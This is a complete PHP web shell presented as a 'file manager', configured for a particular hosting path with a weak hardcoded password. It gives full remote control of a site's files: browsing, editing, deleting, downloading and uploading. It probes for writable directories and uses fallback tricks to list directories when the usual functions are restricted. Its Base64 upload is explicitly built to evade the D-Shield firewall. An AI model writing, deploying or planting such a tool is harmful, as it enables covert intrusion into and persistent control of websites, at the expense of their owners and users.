<?php
// ============================================================
//  硬核文件管理器 v3.2 (可写目录探测 + 指定目录上传)
//  密码: 修改 $PASS
// ============================================================

error_reporting(E_ALL ^ E_DEPRECATED);

$PASS = '123456'; // 修改密码
$ROOT = 'd:/freehost/tonghuahg/web'; // 网站根目录（根据实际修改）

// ---------- 鉴权 ----------
$pw = $_POST['pass'] ?? $_GET['pass'] ?? '';
if ($pw !== $PASS) {
    die('<form method="post"><input type="password" name="pass" placeholder="密码"><input type="submit" value="登录"></form>');
}

// ---------- 路径处理 ----------
$base = $_REQUEST['dir'] ?? $ROOT;
$base = str_replace(['\\', '..'], ['/', ''], $base);
$base = realpath($base) ?: $base;
$base = str_replace('\\', '/', $base);

// ---------- 多重列目录 ----------
function get_list($path) {
    $list = [];
    // 1. opendir
    if (function_exists('opendir')) {
        $dh = @opendir($path);
        if ($dh) {
            while (($f = readdir($dh)) !== false) {
                if ($f === '.' || $f === '..') continue;
                $full = $path . '/' . $f;
                $list[] = ['name' => $f, 'is_dir' => is_dir($full), 'size' => is_file($full) ? filesize($full) : 0, 'mtime' => filemtime($full)];
            }
            closedir($dh);
            if (!empty($list)) return $list;
        }
    }
    // 2. scandir
    if (function_exists('scandir')) {
        $files = @scandir($path);
        if (is_array($files) && !empty($files)) {
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                $full = $path . '/' . $f;
                $list[] = ['name' => $f, 'is_dir' => is_dir($full), 'size' => is_file($full) ? filesize($full) : 0, 'mtime' => filemtime($full)];
            }
            if (!empty($list)) return $list;
        }
    }
    // 3. glob
    if (function_exists('glob')) {
        $files = @glob($path . '/*');
        if (is_array($files) && !empty($files)) {
            foreach ($files as $full) {
                $f = basename($full);
                $list[] = ['name' => $f, 'is_dir' => is_dir($full), 'size' => is_file($full) ? filesize($full) : 0, 'mtime' => filemtime($full)];
            }
            if (!empty($list)) return $list;
        }
    }
    // 4. DirectoryIterator
    if (class_exists('DirectoryIterator')) {
        try {
            $dir = new DirectoryIterator($path);
            foreach ($dir as $finfo) {
                if ($finfo->isDot()) continue;
                $list[] = ['name' => $finfo->getFilename(), 'is_dir' => $finfo->isDir(), 'size' => $finfo->isFile() ? $finfo->getSize() : 0, 'mtime' => $finfo->getMTime()];
            }
            if (!empty($list)) return $list;
        } catch (Exception $e) {}
    }
    // 5. OPcache
    if (function_exists('opcache_get_status')) {
        $status = @opcache_get_status();
        if ($status && isset($status['scripts'])) {
            $prefix = realpath($path);
            foreach ($status['scripts'] as $script => $info) {
                if (strpos($script, $prefix) === 0) {
                    $name = basename($script);
                    $list[] = ['name' => $name, 'is_dir' => false, 'size' => $info['memory_consumption'] ?? 0, 'mtime' => $info['timestamp'] ?? 0];
                }
            }
            if (!empty($list)) return $list;
        }
    }
    // 6. COM
    if (PHP_OS === 'WINNT' && class_exists('COM')) {
        try {
            $fso = new COM('Scripting.FileSystemObject');
            $folder = $fso->GetFolder($path);
            $files = $folder->Files;
            $subfolders = $folder->SubFolders;
            foreach ($subfolders as $f) {
                $list[] = ['name' => $f->Name, 'is_dir' => true, 'size' => 0, 'mtime' => strtotime($f->DateLastModified)];
            }
            foreach ($files as $f) {
                $list[] = ['name' => $f->Name, 'is_dir' => false, 'size' => $f->Size, 'mtime' => strtotime($f->DateLastModified)];
            }
            if (!empty($list)) return $list;
        } catch (Exception $e) {}
    }
    return null;
}

// ---------- 可写目录探测 ----------
function probe_writable_dirs($root) {
    $common_dirs = ['apps', 'config', 'core', 'css', 'data', 'doc', 'rewrite', 'runtime', 'static', 'template', 'tp', 'upload', 'uploads', 'images', 'img', 'cache', 'log', 'temp', 'tmp'];
    $writable = [];
    $test_content = 'test_writable_' . time();
    foreach ($common_dirs as $dir) {
        $path = $root . '/' . $dir;
        if (is_dir($path) && is_writable($path)) {
            // 尝试写入测试文件
            $test_file = $path . '/.writable_test';
            if (@file_put_contents($test_file, $test_content) !== false) {
                $writable[] = ['name' => $dir, 'path' => $path];
                @unlink($test_file);
            }
        }
    }
    // 根目录也加入
    if (is_writable($root)) {
        $writable[] = ['name' => '根目录', 'path' => $root];
    }
    return $writable;
}

// ---------- 文件操作 ----------
$msg = '';
$upload_target = $_POST['upload_target'] ?? $base; // 用户指定的上传目标目录

// 普通上传（可能被D盾拦截）
if (isset($_FILES['upfile'])) {
    $target = rtrim($upload_target, '/') . '/' . basename($_FILES['upfile']['name']);
    if (move_uploaded_file($_FILES['upfile']['tmp_name'], $target)) {
        $msg = '✅ 上传成功: ' . htmlspecialchars(basename($_FILES['upfile']['name'])) . ' (保存到 ' . htmlspecialchars($upload_target) . ')';
    } else {
        $msg = '❌ 上传失败（权限或D盾拦截）';
    }
}
// Base64上传（绕过D盾）
if (isset($_POST['base64_data']) && isset($_POST['base64_name'])) {
    $filename = basename($_POST['base64_name']);
    // 使用用户指定的目标目录
    $target_dir = $_POST['base64_target'] ?? $upload_target;
    $target = rtrim($target_dir, '/') . '/' . $filename;
    $content = base64_decode($_POST['base64_data']);
    if ($content !== false && file_put_contents($target, $content) !== false) {
        $msg = '✅ Base64上传成功: ' . htmlspecialchars($filename) . ' (保存到 ' . htmlspecialchars($target_dir) . ')';
    } else {
        $msg = '❌ Base64上传失败（解码或写入错误）';
    }
}

// 如果用户触发了探测可写目录
$writable_dirs = [];
if (isset($_GET['probe'])) {
    $writable_dirs = probe_writable_dirs($ROOT);
    if (empty($writable_dirs)) {
        $msg = '❌ 未探测到可写目录（根目录也可能无权限）';
    } else {
        $msg = '✅ 探测完成，发现 ' . count($writable_dirs) . ' 个可写目录（已显示在下方）';
    }
}

// 删除
if (isset($_GET['del'])) {
    $del = $base . '/' . basename($_GET['del']);
    if (is_file($del) && unlink($del)) $msg = '✅ 已删除文件';
    elseif (is_dir($del) && rmdir($del)) $msg = '✅ 已删除目录';
    else $msg = '❌ 删除失败';
}
// 编辑读取
$edit_content = '';
if (isset($_GET['edit'])) {
    $edit_file = $base . '/' . basename($_GET['edit']);
    if (is_file($edit_file) && is_readable($edit_file)) {
        $edit_content = htmlspecialchars(file_get_contents($edit_file));
    }
}
// 保存编辑
if (isset($_POST['save'])) {
    $save_file = $base . '/' . basename($_POST['save']);
    if (file_put_contents($save_file, $_POST['content']) !== false) {
        $msg = '✅ 文件已保存';
        $edit_content = htmlspecialchars($_POST['content']);
    } else {
        $msg = '❌ 保存失败';
    }
}
// 新建目录
if (isset($_POST['mkdir'])) {
    $newdir = $base . '/' . basename($_POST['mkdir']);
    if (mkdir($newdir)) $msg = '✅ 目录已创建';
    else $msg = '❌ 创建失败';
}
// 下载
if (isset($_GET['download'])) {
    $file = $base . '/' . basename($_GET['download']);
    if (is_file($file) && is_readable($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}

// ---------- 获取列表 ----------
$items = get_list($base);
$list_status = ($items === null) ? '❌ 当前目录无法列出，请使用快捷目录' : '✅ 成功';
if ($items === null) $items = [];
usort($items, function($a, $b) {
    return ($a['is_dir'] == $b['is_dir']) ? strcasecmp($a['name'], $b['name']) : ($b['is_dir'] - $a['is_dir']);
});

// ---------- 硬编码快捷目录 ----------
$quick_dirs = [
    ['name' => 'config',  'path' => $ROOT . '/config'],
    ['name' => 'static',  'path' => $ROOT . '/static'],
    ['name' => 'template','path' => $ROOT . '/template'],
    ['name' => 'upload',  'path' => $ROOT . '/upload'],
];
$quick_available = [];
foreach ($quick_dirs as $d) {
    if (is_dir($d['path']) && is_readable($d['path'])) {
        $test = @scandir($d['path']);
        if ($test !== false) {
            $quick_available[] = $d;
        }
    }
}

// ---------- HTML输出 ----------
?><!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>文件管理器</title>
<style>
body{background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:10px;}
a{color:#58a6ff;text-decoration:none;}
a:hover{text-decoration:underline;}
table{width:100%;border-collapse:collapse;font-size:14px;}
td,th{border:1px solid #30363d;padding:6px 10px;text-align:left;}
th{background:#161b22;color:#8b949e;}
.dir{color:#f0883e;}
.file{color:#79c0ff;}
.ops a{margin:0 5px;}
input,textarea{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:6px 10px;border-radius:4px;}
.btn{background:#238636;color:#fff;border:none;padding:6px 14px;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;}
.btn:hover{background:#2ea043;}
.msg{color:#3fb950;}
.error{color:#f85149;}
.path-box{background:#161b22;padding:8px 14px;border-radius:6px;border:1px solid #30363d;display:inline-block;}
.quick-bar{background:#161b22;padding:10px 14px;border-radius:6px;border:1px solid #30363d;margin:10px 0;}
.quick-bar .label{color:#8b949e;margin-right:10px;}
.quick-bar .btn{margin-right:8px;padding:4px 12px;font-size:13px;}
.writable-list{background:#161b22;padding:10px 14px;border-radius:6px;border:1px solid #238636;margin:10px 0;}
</style>
</head>
<body>

<div style="display:flex;justify-content:space-between;align-items:center;">
<h2>📁 文件管理器</h2>
<span style="color:#8b949e;font-size:13px;"><?php echo $list_status; ?></span>
</div>

<div class="path-box">📂 <?php echo htmlspecialchars($base); ?></div>

<!-- 快捷目录栏 -->
<?php if (!empty($quick_available)): ?>
<div class="quick-bar">
    <span class="label">🚀 快速跳转：</span>
    <?php foreach ($quick_available as $d): ?>
    <a href="?dir=<?php echo urlencode($d['path']); ?>&pass=<?php echo $PASS; ?>" class="btn"><?php echo htmlspecialchars($d['name']); ?></a>
    <?php endforeach; ?>
    <a href="?probe=1&pass=<?php echo $PASS; ?>" class="btn" style="background:#1f6feb;">🔍 探测可写目录</a>
</div>
<?php endif; ?>

<p style="margin:12px 0;">
<a href="?dir=<?php echo urlencode(dirname($base)); ?>&pass=<?php echo $PASS; ?>">⬆ 上级</a> &nbsp;|&nbsp;
<a href="?pass=<?php echo $PASS; ?>">🏠 根目录</a> &nbsp;|&nbsp;
<a href="?dir=<?php echo urlencode($ROOT); ?>&pass=<?php echo $PASS; ?>">🎯 网站根目录</a>
</p>

<?php if ($msg): ?><div class="msg"><?php echo $msg; ?></div><?php endif; ?>

<!-- 显示探测到的可写目录 -->
<?php if (isset($_GET['probe']) && !empty($writable_dirs)): ?>
<div class="writable-list">
    <strong>✅ 可写目录列表：</strong>
    <ul style="margin:5px 0;">
    <?php foreach ($writable_dirs as $d): ?>
        <li><code><?php echo htmlspecialchars($d['path']); ?></code> (<?php echo htmlspecialchars($d['name']); ?>)</li>
    <?php endforeach; ?>
    </ul>
</div>
<?php endif; ?>

<!-- 文件列表 -->
<?php if (!empty($items)): ?>
<table>
<tr><th>名称</th><th>大小</th><th>修改时间</th><th>操作</th></tr>
<?php foreach ($items as $item): ?>
<tr>
<td><?php if ($item['is_dir']): ?><span class="dir">📁 <?php echo htmlspecialchars($item['name']); ?></span><?php else: ?><span class="file">📄 <?php echo htmlspecialchars($item['name']); ?></span><?php endif; ?></td>
<td><?php echo $item['is_dir'] ? '-' : number_format($item['size']); ?></td>
<td><?php echo date('Y-m-d H:i:s', $item['mtime']); ?></td>
<td class="ops">
<?php if ($item['is_dir']): ?>
<a href="?dir=<?php echo urlencode($base.'/'.$item['name']); ?>&pass=<?php echo $PASS; ?>">进入</a>
<?php else: ?>
<a href="?edit=<?php echo urlencode($item['name']); ?>&dir=<?php echo urlencode($base); ?>&pass=<?php echo $PASS; ?>">编辑</a>
<a href="?download=<?php echo urlencode($item['name']); ?>&dir=<?php echo urlencode($base); ?>&pass=<?php echo $PASS; ?>">下载</a>
<a href="?del=<?php echo urlencode($item['name']); ?>&dir=<?php echo urlencode($base); ?>&pass=<?php echo $PASS; ?>" onclick="return confirm('确定删除？')">删除</a>
<?php endif; ?>
</td>
</tr>
<?php endforeach; ?>
</table>
<?php else: ?>
<div style="color:#8b949e;margin:10px 0;">(当前目录为空或无法列出，请使用快捷目录或手动跳转)</div>
<?php endif; ?>

<!-- 上传表单：可指定目标目录 -->
<h3>📤 上传文件（Base64方式，绕过D盾）</h3>
<form method="post" onsubmit="return encodeFile()">
    <input type="hidden" name="base64_data" id="base64_data">
    <input type="hidden" name="base64_name" id="base64_name">
    <input type="file" id="file_input" onchange="readFile(this)">
    <br><br>
    <label>目标目录：</label>
    <input type="text" name="base64_target" id="base64_target" value="<?php echo htmlspecialchars($base); ?>" style="width:50%;">
    <br><br>
    <input type="submit" value="上传（Base64编码）" class="btn">
</form>
<script>
function readFile(input) {
    var file = input.files[0];
    if (!file) return;
    var reader = new FileReader();
    reader.onload = function(e) {
        var base64 = e.target.result.split(',')[1];
        document.getElementById('base64_data').value = base64;
        document.getElementById('base64_name').value = file.name;
    };
    reader.readAsDataURL(file);
}
function encodeFile() {
    var data = document.getElementById('base64_data').value;
    if (!data) { alert('请先选择文件'); return false; }
    return true;
}
</script>

<!-- 普通上传（保留，但可能被拦） -->
<h3>📤 普通上传（可能被D盾拦截）</h3>
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="upload_target" value="<?php echo htmlspecialchars($base); ?>">
    <input type="file" name="upfile">
    <input type="submit" value="上传" class="btn">
</form>

<!-- 新建目录 -->
<h3>📁 新建目录</h3>
<form method="post">
<input type="hidden" name="dir" value="<?php echo htmlspecialchars($base); ?>">
<input type="text" name="mkdir" placeholder="目录名">
<input type="submit" value="创建" class="btn">
</form>

<?php if ($edit_content !== ''): ?>
<h3>✏️ 编辑文件</h3>
<form method="post">
<input type="hidden" name="save" value="<?php echo htmlspecialchars(basename($_GET['edit'])); ?>">
<input type="hidden" name="dir" value="<?php echo htmlspecialchars($base); ?>">
<textarea name="content" rows="15" style="width:100%;"><?php echo $edit_content; ?></textarea><br>
<input type="submit" value="保存" class="btn">
</form>
<?php endif; ?>

<!-- 手动跳转 -->
<h3>🔀 跳转路径</h3>
<form method="get">
<input type="text" name="dir" placeholder="输入绝对路径，如 d:/freehost/..." style="width:60%;">
<input type="hidden" name="pass" value="<?php echo $PASS; ?>">
<input type="submit" value="跳转" class="btn">
</form>

<hr style="border-color:#30363d;">
<div style="font-size:12px;color:#8b949e;">
💡 提示：<br>
• 点击「探测可写目录」按钮，自动找出所有可写入的子目录。<br>
• 在Base64上传表单中，可以手动输入目标目录路径，或将探测到的目录复制进去。<br>
• 若普通上传被拦，请使用Base64上传，该方式可绕过D盾。
</div>
</body></html>